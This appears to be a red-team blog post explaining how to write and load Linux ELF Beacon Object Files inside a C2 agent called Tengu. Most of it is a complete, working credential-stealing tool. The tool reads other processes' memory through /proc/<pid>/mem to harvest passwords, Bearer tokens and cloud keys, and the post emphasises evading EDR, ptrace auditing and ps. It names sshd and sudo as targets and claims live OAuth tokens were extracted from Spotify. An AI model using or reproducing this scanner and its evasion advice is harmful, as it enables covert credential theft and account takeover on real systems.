---
title: "Linux ELF BOFs with Tengu"
description: "Writing and executing Linux Beacon Object Files in-process using Tengu's inline-execute command."
date: "2026-07-03"
author: "bbuddha"
---

Windows red teamers are familiar with BOFs (Beacon Object Files) - small COFF `.o` files executed in-process inside a Beacon without spawning a new process. Tengu brings the same concept to Linux using ELF relocatable objects. Same idea, different binary format, different attack surface.

This article walks through how it works, how to write a BOF, and some of the loader internals.

## What is a Linux ELF BOF?

A BOF is a compiled object file (`.o`) that runs inside the agent process directly. No fork, no exec, no disk artifact beyond the initial transfer. The agent loads the object, resolves its symbols against a BeaconAPI table, applies relocations, and calls the `go()` entry point.

On Linux, object files use the ELF format with type `ET_REL` (relocatable). You compile with `gcc -c` and get a `.o` that contains `.text`, `.rodata`, `.bss` sections and a relocation table.

Compared to spawning a subprocess with `shell`:
- No new process in the process list
- No `/proc/<pid>/cmdline` exposure
- Output is captured directly, no pipe, no pty

## Writing a BOF

The contract is simple: implement a function named `go(char* args, int args_len)`. Declare any BeaconAPI functions you need as external.

```c
#include <stdarg.h>
#include <sys/utsname.h>

void BeaconPrintf(int type, const char* fmt, ...);
#define CALLBACK_OUTPUT 0

void go(char* args, int args_len) {
    (void)args; (void)args_len;

    struct utsname u;
    uname(&u);

    BeaconPrintf(CALLBACK_OUTPUT,
        "hostname : %s\n"
        "kernel   : %s %s\n"
        "arch     : %s\n",
        u.nodename, u.sysname, u.release, u.machine
    );
}
```

Compile:

```sh
gcc -c -fno-stack-protector -o sysinfo.o sysinfo.c
```

The `-fno-stack-protector` avoids pulling in `__stack_chk_fail` as an unresolved dependency. The BOF loader resolves it via `dlsym`, but it is cleaner to leave it out when you do not need it.

Then from a Tengu session:

```
inline-execute /path/to/sysinfo.o
```

## Available BeaconAPI

The functions available in the BOF are the same ones shipped with Havoc/Cobalt Strike BOFs, mapped to Linux equivalents:

| Function | Description |
|---|---|
| `BeaconPrintf(type, fmt, ...)` | Formatted output - main way to return text |
| `BeaconOutput(type, data, len)` | Raw bytes output |
| `BeaconDataParse(parser, buf, len)` | Initialize argument parser |
| `BeaconDataInt(parser)` | Read 4-byte int from args |
| `BeaconDataShort(parser)` | Read 2-byte short from args |
| `BeaconDataExtract(parser, &len)` | Read length-prefixed blob from args |
| `BeaconFormatAlloc(format, size)` | Allocate format buffer |
| `BeaconFormatPrintf(format, fmt, ...)` | Printf into format buffer |
| `BeaconFormatToOutput(type, format)` | Flush format buffer to output |
| `BeaconFormatFree(format)` | Free format buffer |
| `BeaconIsAdmin()` | Returns 1 if `geteuid() == 0` |

Any other symbol - `getuid`, `gethostname`, `read`, `openat`, etc. - is resolved against the process via `dlsym(RTLD_DEFAULT, name)`. If the agent is linked against libc (it is), you have access to the full C library.

## Passing arguments

Arguments are packed by the teamserver using a typed format. Each argument has a 2-byte type tag, a 4-byte length, and the value. Types: `str` (2), `int` (1), `short` (0), `bin` (8).

From the console:

```
inline-execute /path/to/bof.o str:hello int:1234
```

In the BOF:

```c
typedef struct { char* original; char* buffer; int length; int size; } datap;

void BeaconDataParse(datap* parser, char* buf, int len);
char* BeaconDataExtract(datap* parser, int* size);
int   BeaconDataInt(datap* parser);

void go(char* args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char* s   = BeaconDataExtract(&parser, NULL);
    int   num = BeaconDataInt(&parser);

    BeaconPrintf(CALLBACK_OUTPUT, "str=%s num=%d\n", s, num);
}
```

## How the loader works

When `inline-execute` is run, the teamserver reads the `.o` file from disk and sends the raw bytes to the agent. The agent's ELF BOF loader then:

1. **Validates** the ELF header - `ET_REL`, `EM_X86_64`, 64-bit class.
2. **Allocates a single contiguous RWX mapping** large enough for all allocatable sections (`.text`, `.rodata`, `.data`, `.bss`) plus a GOT area and a trampoline area.
3. **Copies sections** into the mapping. `.bss` stays zero (anonymous mmap is already zeroed).
4. **Applies RELA relocations**. The main types used by `gcc -c` output:
   - `R_X86_64_PC32` / `R_X86_64_PLT32` - PC-relative 32-bit call or reference
   - `R_X86_64_64` - absolute 64-bit reference
   - `R_X86_64_GOTPCREL*` - GOT-indirect reference for PIC global variable access
5. **Resolves symbols** - BeaconAPI functions are matched against the internal table first, then `dlsym(RTLD_DEFAULT, name)` for anything else.
6. **Calls `go(args, args_len)`** via a function pointer.
7. **Collects BeaconPrintf output** and sends it back to the teamserver as a `COMMAND_OUTPUT` packet.

## The trampoline problem

The most subtle part of the loader is handling `PLT32` relocations to external symbols. On x86_64, a PC-relative 32-bit call only has ±2 GB of reach. That is fine for intra-BOF references since everything is in the same mapping. But Tengu is compiled with `-fPIE -pie`. PIE executables are loaded at a kernel-assigned base, typically in the `0x555555...` range. Anonymous `mmap` allocations land in the `0x7f...` range. The distance between them can exceed 2 GB.

This means a call from the BOF's `.text` to `BeaconPrintf` (which lives inside Tengu) would overflow a 32-bit PC-relative offset and land at the wrong address - SIGSEGV.

The fix is trampolines. For any `PLT32`/`PC32` relocation where the delta does not fit in `int32_t`, the loader writes a 12-byte stub at a known offset inside the same mapping:

```asm
mov rax, <abs64_target>   ; 48 B8 <8 bytes>
jmp rax                   ; FF E0
```

The call instruction is then patched to jump to the stub. Since both the call site and the trampoline are inside the same `mmap` region, the 32-bit offset to the stub is always short. The stub then jumps to the real 64-bit address unconditionally. Same mechanism the Linux kernel uses when loading kernel modules that need to call core kernel functions outside the module's load range.

## What you can do with it

**Capability dump** - read `/proc/self/status` or call `cap_get_proc()` in-process without spawning a subprocess.

**Memory enumeration** - parse `/proc/self/maps` directly to enumerate loaded libraries, heap layout, guard pages.

**Raw syscalls** without any libc dependency:

```c
static long syscall1(long n, long a1) {
    long r;
    __asm__ volatile("syscall"
        : "=a"(r) : "0"(n), "D"(a1) : "rcx", "r11", "memory");
    return r;
}
```

**Credential access without forking** - `pread` from `/proc/<pid>/mem` directly. No ptrace, no subprocess visible in `ps`.

The BOF runs in-process inside Tengu and shares its file descriptors, capabilities, and namespace. If Tengu has a capability or an open file descriptor, your BOF has it too.

## Real example: in-memory credential scanner

Here is a BOF that scans the heap and data segments of a running process for credential patterns - no ptrace, no subprocess, nothing in `ps` output.

The trick: Linux lets you read another process's memory via `/proc/<pid>/mem` using `pread` with a file offset equal to the virtual address, as long as you share the same UID (or hold `CAP_SYS_PTRACE`). A BOF running inside Tengu can do this silently.

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

void BeaconPrintf(int type, const char* fmt, ...);
void BeaconDataParse(void* parser, char* buf, int len);
int  BeaconDataInt(void* parser);

typedef struct { char* original; char* buffer; int length; int size; } datap;

#define CALLBACK_OUTPUT 0
#define CHUNK_SIZE      65536

static const char* PATTERNS[] = {
    "password=", "Password=", "PASSWORD=",
    "passwd=", "secret=", "token=",
    "Authorization: Bearer ",
    "Authorization: Basic ",
    "AWS_SECRET_ACCESS_KEY",
    "GITHUB_TOKEN=",
    NULL
};

void go(char* args, int args_len) {
    datap p;
    BeaconDataParse(&p, args, args_len);
    int pid = BeaconDataInt(&p);

    if (pid <= 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] usage: inline-execute memscan.o int:<pid>\n");
        return;
    }

    char maps_path[64], mem_path[64];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    snprintf(mem_path,  sizeof(mem_path),  "/proc/%d/mem",  pid);

    int maps_fd = open(maps_path, O_RDONLY);
    if (maps_fd < 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] open(%s) failed\n", maps_path);
        return;
    }
    int mem_fd = open(mem_path, O_RDONLY);
    if (mem_fd < 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] open(%s) failed - need same uid or CAP_SYS_PTRACE\n", mem_path);
        close(maps_fd);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] scanning pid %d memory\n", pid);

    char   line[512];
    int    li = 0;
    char   rbuf[4096];
    int    rread = 0, rpos = 0;
    char*  chunk = malloc(CHUNK_SIZE);
    if (!chunk) { close(mem_fd); close(maps_fd); return; }

    /* walk /proc/<pid>/maps line by line */
    for (;;) {
        if (rpos >= rread) {
            rread = read(maps_fd, rbuf, sizeof(rbuf));
            rpos  = 0;
            if (rread <= 0) break;
        }
        char c = rbuf[rpos++];
        if (c != '\n' && li < 511) { line[li++] = c; continue; }
        line[li] = 0; li = 0;

        uint64_t start = 0, end = 0;
        char perms[8] = {0};
        sscanf(line, "%lx-%lx %4s", &start, &end, perms);

        /* only scan readable non-exec regions: heap, stack, data, anon mappings */
        if (perms[0] != 'r' || perms[2] == 'x') continue;
        if (end - start > 64 * 1024 * 1024)      continue;

        size_t region_sz = end - start;
        size_t offset    = 0;

        while (offset < region_sz) {
            size_t  to_read = CHUNK_SIZE;
            if (offset + to_read > region_sz) to_read = region_sz - offset;

            ssize_t n = pread(mem_fd, chunk, to_read, (off_t)(start + offset));
            if (n <= 0) break;

            for (int pi = 0; PATTERNS[pi]; pi++) {
                size_t plen = strlen(PATTERNS[pi]);
                for (ssize_t i = 0; i + (ssize_t)plen < n; i++) {
                    if (memcmp(chunk + i, PATTERNS[pi], plen) != 0) continue;

                    /* print up to 80 printable chars of context */
                    char ctx[81] = {0};
                    ssize_t clen = n - i < 80 ? n - i : 80;
                    memcpy(ctx, chunk + i, (size_t)clen);
                    for (int k = 0; k < (int)clen; k++)
                        if ((unsigned char)ctx[k] < 0x20 || (unsigned char)ctx[k] > 0x7e)
                            ctx[k] = '.';

                    BeaconPrintf(CALLBACK_OUTPUT, "  [0x%lx] %s\n",
                        start + offset + (size_t)i, ctx);
                }
            }
            offset += (size_t)n;
        }
    }

    free(chunk);
    close(mem_fd);
    close(maps_fd);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] done\n");
}
```

Compile and run:

```sh
gcc -c -fno-stack-protector -o memscan.o memscan.c
```

```
inline-execute /path/to/memscan.o int:8191
```

![memscan BOF live output on Spotify](/bof-tengu.png)

Live output from a running Spotify process. The Bearer tokens at `0x7f44...` and `0x7f45...` addresses are live OAuth tokens sitting in the heap - valid, usable, extracted in one BOF execution with no ptrace, no process suspension, nothing in `ps`.

**Why this works without ptrace**: `pread` on `/proc/<pid>/mem` is not a ptrace operation. It does not attach to the process, does not stop it, and does not generate a `PTRACE_ATTACH` audit event. Most EDRs monitor `ptrace(2)` syscalls, not direct `/proc` reads.

**Yama ptrace_scope**: most distros ship with `kernel.yama.ptrace_scope=1`, which blocks `/proc/<pid>/mem` access for non-child processes even with the same UID. Check with `cat /proc/sys/kernel/yama/ptrace_scope`. To scan arbitrary same-uid processes you need either `ptrace_scope=0`, `CAP_SYS_PTRACE`, or to be root. With `ptrace_scope=1` the BOF still works against processes that Tengu spawned directly (e.g. via `shell`), since they are children of the agent.

**What to target**: `sshd` workers hold the plaintext password during PAM authentication for a brief window. `sudo` holds the password while validating. Any process that reads credentials from env or config and keeps them in heap will have them here. Running without arguments and iterating over `/proc/*/maps` to find all same-uid processes is a five-line extension.

## Compatibility

The loader expects:
- x86_64 ELF relocatable (output of `gcc -c` on Linux x86_64)
- Entry point named `go(char* args, int args_len)`
- No TLS variables (`__thread` will fail to relocate)
- No C++ exceptions (unwind tables are not handled)

Compile with `-fno-stack-protector` to avoid the `__stack_chk_fail` dependency. Any standard C library function available in the target process is callable via `dlsym`. System calls via inline asm work without any dependency at all.
